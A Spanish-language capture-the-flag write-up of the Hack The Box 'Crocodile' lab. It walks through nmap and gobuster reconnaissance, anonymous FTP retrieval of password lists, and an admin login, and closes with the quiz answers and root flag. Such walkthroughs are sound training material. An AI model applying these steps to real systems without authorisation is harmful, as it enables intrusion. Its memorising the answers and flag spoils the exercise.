---
title: HTB - Crocodile
date: 2022-06-21
categories: [Hack The Box, Starting Point]
tag: [Web, Sql, Starting Point - Tier 2]
img_path: /assets/img/htb/crocodile
image:
   path: crocodile.png
   width: 321
   height: 170
---
<h2 style="color:#74b4f4">Escaneo</h2>
---
Realizamos un escaneo de `nmap` para identificar los puertos abiertos y servicios.

```console
nmap 10.129.79.250 -sC -sV -v

-sC: empleamos scripts predeterminados en el escaneo
```

Resultado del escaneo:

```console
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 02:02 CDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Nmap scan report for 10.129.79.250
Host is up (0.42s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-favicon: Unknown favicon MD5: 1248E68909EAE600881B8DB1AD07F356
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix

NSE: Script Post-scanning.
Initiating NSE at 02:03
Completed NSE at 02:03, 0.00s elapsed
Initiating NSE at 02:03
Completed NSE at 02:03, 0.00s elapsed
Initiating NSE at 02:03
Completed NSE at 02:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.95 seconds
```

Existen 2 puertos abiertos en la máquina objetivo, el puerto 80 corriendo un servidor web Apache y el puerto 21 corriendo un servidor ftp. Primero vamos a visitar el servidor web a través del navegador.

![](Pasted image 20220427025211.png)

Navegando por la página no pude encontrar un formulario, así que vamos a utilizar la herramienta <b style="color:#800000">gobuster</b> que utiliza <b style="color:#800000">brute-forcing</b> para descubrir directorios y archivos en un servidor web.

```console
gobuster -u {target ip} -w /usr/share/wordlists/directory-list-2.3-small.txt -w php 
-t 100
```

Utilizarémos <b style="color:#800000">directory-list-2.3-small.txt</b> para realizar un descubrimiento más rápido y especificaremos que busque además archivos <b style="color:#800000">php</b>.

```console
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.10.63
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/04/27 03:01:47 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1577]
/assets               (Status: 301) [Size: 313] [--> http://10.129.10.63/assets/]
/css                  (Status: 301) [Size: 310] [--> http://10.129.10.63/css/]   
/js                   (Status: 301) [Size: 309] [--> http://10.129.10.63/js/]    
/logout.php           (Status: 302) [Size: 0] [--> login.php]                    
/config.php           (Status: 200) [Size: 0]                                    
/fonts                (Status: 301) [Size: 312] [--> http://10.129.10.63/fonts/] 
/dashboard            (Status: 301) [Size: 316] [--> http://10.129.10.63/dashboard/]
```

Hemos descubierto un archivo llamado <b style="color:#800000">login.php</b>, ahora tenemos un vector de ataque para obtener la flag.

![](Pasted image 20220427030623.png)
![](Pasted image 20220427030556.png)

Podemos intentar una SQL Injection pero gracias al escaneo realizado previamente podemos ver que dentro del servidor <b style="color:#800000">ftp</b> hay dos archivos que pueden contener usuarios y sus respectivas contraseñas para iniciar sesión correctamente.
Accedemos al servidor ftp de manera anónima, descargamos los archivos y vemos su contenido.

```console
ftp {target ip}
```

```console
Connected to 10.129.10.63.
220 (vsFTPd 3.0.3)
Name (10.129.10.63:epsylon): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||43390|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||47042|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |*****************************************************************************|    33        0.20 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.04 KiB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||46268|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |*****************************************************************************|    62        0.38 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.09 KiB/s)
```
![](Pasted image 20220427031617.png)

![](Pasted image 20220427031638.png)

Ingresamos el usuario <b style="color:#800000">admin</b> y su contraseña <b style="color:#800000">rKXM59ESxesUFHAd</b> en el formulario.

![](Pasted image 20220427032028.png)

![](Pasted image 20220427031940.png)


<h2 style="color:#74b4f4">Preguntas</h2>
---
1. ¿Qué interruptor de escaneo nmap emplea el uso de scripts predeterminados durante un escaneo?
	<b style="color:#8B2F97">-sC</b>

2. ¿Qué versión de servicio se encuentra ejecutándose en el puerto 21?
	<b style="color:#8B2F97">vsftpd 3.0.3</b>

3. ¿Qué código FTP se nos devuelve para el mensaje "Inicio de sesión FTP anónimo permitido"?
	<b style="color:#8B2F97">230</b>

4. ¿Qué comando podemos usar para descargar los archivos que encontramos en el servidor FTP?
	<b style="color:#8B2F97">get</b>

5. ¿Cuál es uno de los nombres de usuario que suenan con mayor privilegio en la lista que recuperamos?
	<b style="color:#8B2F97">admin</b>

6. ¿Qué versión de Apache HTTP Server se está ejecutando en el host de destino?
	<b style="color:#8B2F97">2.4.41</b>

7. ¿Cuál es el nombre de un útil complemento de análisis de sitios web que podemos instalar en nuestro navegador?
	<b style="color:#8B2F97">Wappalyzer</b>

8. ¿Qué interruptor podemos usar con gobuster para especificar que estamos buscando tipos de archivo específicos?
	<b style="color:#8B2F97">-x</b>

9. ¿Qué archivo hemos encontrado que pueda proporcionarnos un punto de apoyo en el objetivo?
	<b style="color:#8B2F97">login.php</b>

**Root Flag:** <b style="color:#FF8B00">c7110277ac44d78b6a9fff2232434d16</b>
	
![](Pasted image 20220427022458.png)